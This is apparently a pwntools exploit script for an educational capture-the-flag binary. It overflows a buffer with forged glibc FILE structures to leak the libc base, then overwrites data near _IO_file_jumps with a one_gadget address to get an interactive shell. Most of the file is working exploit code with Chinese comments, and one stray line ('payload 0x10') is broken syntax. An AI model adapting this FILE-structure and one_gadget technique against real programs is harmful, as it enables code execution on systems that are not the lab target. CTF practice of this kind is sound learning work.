from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

r = process("./chal")
# r = remote("edu-ctf.zoolab.org",30218)

l = ELF('../libc.so.6')

# r.recvuntil("0x")
# libc = int(r.recvline(),base=16) -  l.sym['printf']
# _IO_file_jumps= libc + l.sym['_IO_file_jumps']
# print("libc",hex(libc))
# print("_IO_file_jumps",hex(_IO_file_jumps))

r.sendlineafter(">","1")

file_flags = p64(0xfbad1800)

# payload = flat(
#     file_flags,0,
#     flag_addrs,0,
#     flag_addrs,flag_addr+0x40,
#     0,0,
#     0,0,
#     0,0,
#     0,0,
#     1
# )

payload = flat(
    file_flags,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    1
)

r.sendlineafter(">","2")
r.sendlineafter("data>",b"A"*0x210+payload)
# 讓sys 幫我們allocate 一些 buffer
# r.sendlineafter(">","3")
# line = r.recvuntil("---")
# print("line",line)


# r.sendlineafter(">","3")
# line = r.recvuntil("---")
# print("line",line)

payload = flat(
    file_flags,0,
    0
)
payload 0x10
# 因該利用最後一個byte會自動被放成\x00 所以payload不用加上去

gdb.attach(r)
r.sendlineafter(">","2")
r.sendlineafter("data>",b"A"*0x210+payload)
# gdb.attach(r)
r.sendlineafter(">","3")
libc = r.recvuntil('-----')
print("libc",libc)
libc = libc[libc.find(b'A'*8)-0x10:libc.find(b'A'*8)-0x8]
libc = u64(libc) - 0x1ecf60
# print("libc",len(libc))
print("libc",hex(libc))

# one_gadget =  libc + 0xe6c81
# r.sendlineafter(">","4")
# r.sendline(p64(one_gadget))

# gdb.attach(r)

# stdin_file_address = libc + 0x1eb980


l = ELF('../libc.so.6')

_IO_file_jumps= libc + l.sym['_IO_file_jumps']

print("_IO_file_jumps",hex(_IO_file_jumps))



file_flag = 0x0800

payload = flat(
    file_flag,0,
    _IO_file_jumps+0x18,0,
    _IO_file_jumps+0x18,_IO_file_jumps+0x18,
    _IO_file_jumps+0x20,0,
    0,0,
    0,0,
    0,0,
    1
)

r.sendlineafter(">","2")
# 這邊payload 送 \x00 是因為one gadget 要求的參數剛好這邊要0
r.sendlineafter("data>",b"\x00"*0x210+payload)

# one_gadget =  libc + 0xe6c81
one_gadget =  libc + 0xe6c7e

r.sendlineafter(">","2")
# r.sendlineafter("data>",p64(one_gadget))
r.sendlineafter("data>",p64(one_gadget)[:-1])
r.sendlineafter(">","3")




r.interactive()

